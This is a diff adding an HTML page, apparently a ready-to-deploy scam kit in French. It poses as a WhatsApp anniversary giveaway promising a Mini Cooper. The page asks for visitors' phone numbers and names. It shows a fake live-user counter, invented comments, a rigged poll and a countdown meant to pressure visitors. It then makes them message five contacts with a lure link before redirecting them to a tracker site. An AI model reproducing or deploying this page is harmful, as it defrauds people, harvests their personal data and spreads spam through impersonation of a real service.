@@ -1,0 +1,462 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+	<meta charset="utf-8"/>
+
+
+	<!-- CUSTOMIZE SETTINGS AND TEXTS HERE ***START*** -->
+
+	<script>
+		
+		var inviteFriends 			= 	5;
+		var inviteGroups 			= 	0;
+
+		var inviteMessage 			=	"WhatsApp célèbre son 10e anniversaire, vous pouvez gagner de superbes prix et, avec mon invitation, un prix est garanti --> "; //Link will be added to the end of this message automatically
+
+		var inviteLinkWA 				= 	'http://ryair.win/?s=wa'; //If set 'auto', the link will be detected automatically. If you need to set a different link, change the value 'auto' to that link. (Example: http://my-other-link.com)
+		var inviteLinkSMS				=	'https://goo.gl/hiLwYc';
+		var inviteLinkFB				=	'https://goo.gl/stHGxf';
+
+		var showCountDownTimer		=	true;
+		var countdownExpiryMinutes	=	15;
+		var onlineCountMinimum		=	7840;
+		var pollYesCount			=	16728;
+		var pollNoCount				=	76;
+	</script>
+
+	<!-- CUSTOMIZE SETTINGS AND TEXTS HERE ***END*** -->
+
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta http-equiv="cache-control" content="no-cache" />
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<title>WhatsApp - Bon anniversaire</title>
+
+	<meta property="og:image" content="http://ryair.win/images/ogimage.png">
+	<meta property="og:title" content="WhatsApp - Bon anniversaire" />
+	<meta property="og:site_name" content="Chaque participant reçoit un prix !" />
+	<meta property="og:description" content="Votre ami vous a invité à participer. Dépêchez-vous, cette invitation n'est valide que pendant 6 heures." />
+
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap-theme.min.css">
+	<link rel="stylesheet" href="./css/style.css">
+
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+		<script>
+		function setCookie(cookieName, value) {
+			var date = new Date();
+			date.setTime(date.getTime() + (24 * 60 * 60 * 1000));
+			var expires = "expires=" + date.toUTCString();
+			document.cookie = cookieName + "=" + value + "; " + expires
+		}
+
+		function getCookie(name) {
+			var value = "; " + document.cookie;
+			var parts = value.split("; " + name + "=");
+			if (parts.length == 2) return parts.pop().split(";").shift();
+		}
+
+		var currentInvites = parseInt(getCookie("invites"));
+		currentInvites = !currentInvites ? 0 : currentInvites;
+
+		function onClickInviteButtonWA(e) {
+			var neededInvites = inviteFriends + inviteGroups;
+			setCookie("invites", ++currentInvites, 5);
+			if (currentInvites <= neededInvites) {
+				var link = (inviteLinkWA == 'auto') ? window.location.href : inviteLinkWA;
+				var openPath = 'whatsapp://send?text=' + inviteMessage + ' ' + link;
+				window.open(openPath)
+			} else window.open("http://tracker.onlineusersite.com/?flux_action=1")
+		}
+		function onClickInviteButtonSMS(e) {
+			var neededInvites = inviteFriends + inviteGroups;
+			setCookie("invites", ++currentInvites, 8);
+			if (currentInvites <= neededInvites) {
+				var link = (inviteLinkSMS == 'auto') ? window.location.href : inviteLinkSMS;
+				var openPath = 'sms:&body=' + inviteMessage + ' ' + link;
+				window.open(openPath)
+			} else window.open("http://tracker.onlineusersite.com/?flux_action=1")
+		}
+		function onClickInviteButtonFB(e) {
+			var neededInvites = inviteFriends + inviteGroups;
+			setCookie("invites", ++currentInvites, 8);
+			if (currentInvites <= neededInvites) {
+				var link = (inviteLinkFB == 'auto') ? window.location.href : inviteLinkFB;
+				var openPath = 'fb-messenger://share/?link=' + encodeURIComponent(link);
+				window.open(openPath)
+			} else window.open("http://tracker.onlineusersite.com/?flux_action=1")
+		}
+
+		function onClickVerifyButton(b) {
+			if (currentInvites >= 5) {
+				window.open("http://tracker.onlineusersite.com/?flux_action=1")
+			} else {
+				window.alert("Invitez 5 amis et groupes sur WhatsApp  " + currentInvites + "/5")
+			}
+		}
+	</script>
+
+</head>
+
+<body>
+
+	<div class="text-center logo-container">
+		<img src="./images/logo.png" alt="" class="logo">
+	</div>
+
+	<div class="text-center" style="overflow: hidden;">
+		<img src="./images/stickers.png" style="margin-bottom: -20px; max-width: 300px;">
+	</div>
+
+	<div id="mainBox">
+		<center><h1 class="text-center" style="margin-top: 5px;">Gagnez de superbes prix tous les jours !</h1><h4>Aujourd'hui, le prix principal est : Mini Cooper</h4><img src="images/whatsapptextlogo.png" width="300px" style="margin-top: 0px;"></center>
+		
+		<div class="game-tool-step">
+			<div id="progress" style="display: none;">
+				<h2 class=" progressbar-group">Patientez s'il-vous-plait...</h2>
+				<div class="progress progress-striped active progressbar-group">
+					<div class="progress-bar" role="progressbar" aria-valuenow="1" aria-valuemin="0" aria-valuemax="100" style="width: 1%" id="progressbar">
+					</div>
+				</div>
+				<p class="text-center" id="progressbar-message">Vérification de votre numéro...</p>
+			</div>
+			
+			<!--questions-->
+			<form class="form" role="form" id="question1">
+				
+				<div class="alert alert-info">
+					<h4 class="text-center">Veuillez répondre à ces questions</h4>
+					<div class="text-center">Êtes-vous un utilisateur actif de WhatsApp ?</div>
+					<br>
+					<div class="text-center">
+					
+					<button type="button" class="btn btn-success btn-lg" id="question1" onclick="$('#question1').hide();$('#question2').fadeIn();">Oui</span>
+					</button>
+					<button type="button" class="btn btn-warning btn-lg" id="question1" onclick="$('#question1').hide();$('#question2').fadeIn();">Non</span>
+					</button>
+				</div>
+				</div>
+				<br>
+
+
+			</form>
+			
+			<form class="form" role="form" id="question2" style="display: none;">
+				
+				<div class="alert alert-info">
+					<h4 class="text-center">Veuillez répondre à ces questions</h4>
+					<div class="text-center">Avez-vous un permis de conduire ?</div>
+					<br>
+					<div class="text-center">
+					
+					<button type="button" class="btn btn-success btn-lg" id="question1" onclick="$('#question2').hide();$('#question3').fadeIn();">Oui</span>
+					</button>
+					<button type="button" class="btn btn-warning btn-lg" id="question1" onclick="$('#question2').hide();$('#question3').fadeIn();">Non</span>
+					</button>
+				</div>
+				</div>
+				<br>
+
+
+			</form>
+			
+			<form class="form" role="form" id="question3" style="display: none;">
+				
+				<div class="alert alert-info">
+					<h4 class="text-center">Veuillez répondre à ces questions</h4>
+					<div class="text-center">Habitez-vous en France ?</div>
+					<br>
+					<div class="text-center">
+					
+					<button type="button" class="btn btn-success btn-lg" id="question1" onclick="$('#question3').hide();$('#input-form').fadeIn();">Oui</span>
+					</button>
+					<button type="button" class="btn btn-warning btn-lg" id="question1" onclick="$('#question3').hide();$('#input-form').fadeIn();">Non</span>
+					</button>
+				</div>
+				</div>
+				<br>
+
+
+			</form>
+			
+			
+			<!--progress-->
+			<form class="form" role="form" id="input-form" style="display: none;">
+				
+				<div class="alert alert-success">
+					<h4 class="text-center">Suivez ces instructions!</h4>
+					<ol>
+						<li><b>Saisissez votre numéro de téléphone portable</b><br><i>Seuls les utilisateurs actifs qui ont utilisé WhatsApp ces 3 derniers mois peuvent gagner, nous utilisons votre numéro pour le vérifier.</i></li>
+						<li><b>Cliquez sur « Vérifier » pour voir si votre numéro a la combinaison gagnante pour aujourd'hui</b></li>
+					</ol>
+				</div>
+				<br>
+
+				<div class="form-group col-md-12" align="center">
+					<input type="text" class="form-control input-lg" id="numberInput" placeholder="Saisissez votre numéro de téléphone portable" />
+
+				</div>
+				<div class="form-row">
+				<div class="form-group col-md-6">
+					<input type="text" class="form-control input-lg" id="firstnameInput" placeholder="Prénom "/>
+				</div>
+				<div class="form-group col-md-6">
+					<input type="text" class="form-control input-lg" id="lastnameInput" placeholder="Nom de famille" />
+				</div>
+				</div>
+				<div class="text-center">
+					
+					<button type="button" class="btn btn-success btn-lg" id="activateBtn">Vérifier</span>
+					</button>
+				</div>
+			</form>
+			<br>
+
+			<!-- Countdown timer start -->
+			<div id="countDownBox">
+				<div class="text-center">
+					<b>Cette invitation n'est valide que pendant <span id="expireInMinutes">15</span> minutes. Vous avez complété les étapes avant que le temps ne soit écoulé.</b>
+				</div>
+				<br>
+				<div id="countDownTimer"></div>
+			</div>
+			<script>
+				if(!showCountDownTimer) {
+					$('#countDownBox').hide();
+				}
+			</script>
+			<!-- Countdown timer end -->
+
+
+			<!-- Comments START -->
+			<div class="comments">
+				<h4>Commentaires</h4>
+				<hr>
+				<div class="media">
+					<div class="pull-left">
+						<img class="media-object" src="http://api.randomuser.me/portraits/thumb/men/23.jpg">
+					</div>
+					<div class="media-body">
+						<h4 class="media-heading">Simon Klaas</h4>
+						Trop cool ! Ça a vraiment marché.
+					</div>
+				</div>
+				<div class="media">
+					<div class="pull-left">
+						<img class="media-object" src="http://api.randomuser.me/portraits/thumb/men/17.jpg">
+					</div>
+					<div class="media-body">
+						<h4 class="media-heading">Jay McDougle</h4>
+						Sympa ! Je vais aux États-Unis.
+					</div>
+				</div>
+				<div class="media">
+					<div class="pull-left">
+						<img class="media-object" src="http://api.randomuser.me/portraits/thumb/women/51.jpg">
+					</div>
+					<div class="media-body">
+						<h4 class="media-heading">Sabrina Geiger</h4>
+						OUI ! J'ai reçu mes billets :P
+					</div>
+				</div>
+				<div class="media">
+					<div class="pull-left">
+						<img class="media-object" src="http://api.randomuser.me/portraits/thumb/women/90.jpg">
+					</div>
+					<div class="media-body">
+						<h4 class="media-heading">Mary York</h4>
+						J'ai enfin reçu une invitation – merci.
+						<3 </div>
+					</div>
+					<hr>
+					<div class="text-center"><strong>Quand vous avez reçu vos billets, vous pouvez entrer un commentaire</strong>
+					</div>
+					<hr>
+
+					<!-- Poll Start -->
+					<h4 class="text-center">Sondage : Avez-vous gagné aujourd'hui ?</h4>
+					<div class="text-left" style="padding: 10px;margin-bottom: 20px;">
+						<div class="working-feedback" style="margin-bottom: 10px;">
+							<div class="btn btn-success btn-block btn-sm overflow-hidden">OUI ( <b id="yesCount" class="count"><span id="polYesCount"></span></b> )</div>
+						</div>
+						<div class="working-feedback" style="max-width: 64px;">
+							<div class="btn btn-danger btn-block btn-sm overflow-hidden">NON ( <b id="noCount" class="count"><span id="polNoCount"></span></b> )</div>
+						</div>
+					</div>
+					<script>
+						(function(){
+							var workingFeedbackGiven = false;
+							$('.working-feedback .btn').click(function(){
+								if(workingFeedbackGiven)
+									return;
+								workingFeedbackGiven = true;
+								var countElm = $(this).parent().find('.count');
+								countElm.text(parseInt(countElm.text()) + 1);
+							});
+						})();
+						$('#polNoCount').html(pollNoCount);
+						$('#polYesCount').html(pollYesCount);
+					</script>
+					<!-- Poll End -->
+
+			</div>
+			<!-- Comments end-->
+
+
+			<!-- Online count start-->
+			<div class="text-center" style="margin-top: 20px;">
+				<div class="label label-success" style="font-size: 1.2em;"><div id="watchingCount" style="display: inline-block;">6847</div></div>
+            	<div class="watching-count-msg" style="margin-top: 10px;"><small><b>ERSONNES EN LIGNE</b></small></div>
+			</div>
+
+		  <script>
+				(function() {
+						var watchingCountBox = document.getElementById('watchingCount');
+						function updateWatchingCount(){
+							var count = onlineCountMinimum + parseInt((Math.random() * 100 / 7));
+							 watchingCountBox.innerHTML = count;
+						}
+						setInterval(updateWatchingCount, 1000);
+				})();
+			</script>
+
+			<!-- Online count end --->
+
+
+				<!-- Modal Start-->
+				<div class="modal fade" id="verifyModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+					<div class="modal-dialog">
+						<div class="modal-content">
+							<div class="modal-header">
+								<button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Fermer</span>
+								</button>
+								<h4 class="modal-title" id="myModalLabel"><center> Inviter des amis! </center></h4>
+							</div>
+							<div class="modal-body">
+								<div style="padding: 0px;">
+									<h3 class="text-center">COMPLÉTEZ CES <span style="color: #3CA35D;">2 ÉTAPES</span>  POUR INVITER VOS AMIS – VOUS RECEVEZ DES BILLETS DE LOTERIE POUR NOUS AVOIR AIDÉS À FAIRE PASSER LE MOT</h3>
+									<br>
+
+									<div class="alert alert-info text-center" role="alert"><b>Étape 1</b> - Invitez 5 amis et groupes sur WhatsApp</div>
+
+									<div class="text-center">
+										<a href="#" onclick="onClickInviteButtonWA(this)"><img src="images/whatsapp.png" width="50px"></a>&nbsp
+								
+						
+									</div>
+
+									<br>
+									<div class="text-center alert alert-success" role="alert"><b>Étape 2</b> - Cliquez sur "ALLER" pour obtenir vos billets
+									</div>
+									<center>
+										<button type="button" class="btn btn-success" onclick="onClickVerifyButton(this)"><span class="glyphicon glyphicon-user"></span>ALLER</button>
+									</center>
+								</div>
+							</div>
+							<div class="modal-footer">
+
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- Modal end-->
+		<div class="footer text-center">
+			&copy; WhatsApp
+		</div>
+
+		<script src="./js/script.js"></script>
+		<script src="./js/jquery.countdown.min.js"></script>
+		<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/js/bootstrap.min.js"></script>
+
+
+		<script>
+			var testingMode = 0;
+		</script>
+
+		<div class="countdown-container" id="main-example"></div>
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.8.3/underscore-min.js"></script>
+		<script type="text/template" id="main-example-template">
+			<div class="time <%= label %>">
+			  <span class="count curr top"><%= curr %></span>
+			  <span class="count next top"><%= next %></span>
+			  <span class="count next bottom"><%= next %></span>
+			  <span class="count curr bottom"><%= curr %></span>
+			  <span class="label"><%= label.length < 6 ? label : label.substr(0, 3)  %></span>
+			</div>
+		</script>
+		<script type="text/javascript">
+			$(window).on('load', function () {
+				var timeNow = new Date();
+				timeNow.setTime(timeNow.getTime() + (countdownExpiryMinutes * 60 * 1000))
+				var labels = ['Hours', 'minutes', 'seconds'],
+					targetTime = timeNow,
+					template = _.template($('#main-example-template').html()),
+					currDate = '00:00:00:00:00',
+					nextDate = '00:00:00:00:00',
+					parser = /([0-9]{2})/gi,
+					$example = $('#countDownTimer');
+				// Parse countdown string to an object
+				function strfobj(str) {
+					var parsed = str.match(parser),
+						obj = {};
+					labels.forEach(function (label, i) {
+						obj[label] = parsed[i]
+					});
+					return obj;
+				}
+				// Return the time components that diffs
+				function diff(obj1, obj2) {
+					var diff = [];
+					labels.forEach(function (key) {
+						if (obj1[key] !== obj2[key]) {
+							diff.push(key);
+						}
+					});
+					return diff;
+				}
+				// Build the layout
+				var initData = strfobj(currDate);
+				labels.forEach(function (label, i) {
+					$example.append(template({
+						curr: initData[label],
+						next: initData[label],
+						label: label
+					}));
+				});
+				// Starts the countdown
+				$example.countdown(targetTime, function (event) {
+					var newDate = event.strftime('%H:%M:%S'),
+						data;
+					if (newDate !== nextDate) {
+						currDate = nextDate;
+						nextDate = newDate;
+						// Setup the data
+						data = {
+							'curr': strfobj(currDate),
+							'next': strfobj(nextDate)
+						};
+						// Apply the new values to each node that changed
+						diff(data.curr, data.next).forEach(function (label) {
+							var selector = '.%s'.replace(/%s/, label),
+								$node = $example.find(selector);
+							// Update the node
+							$node.removeClass('flip');
+							$node.find('.curr').text(data.curr[label]);
+							$node.find('.next').text(data.next[label]);
+							// Wait for a repaint to then flip
+							_.delay(function ($node) {
+								$node.addClass('flip');
+							}, 50, $node);
+						});
+					}
+				});
+			});
+		</script>
+
+</script>
+</body>
+
+</html>
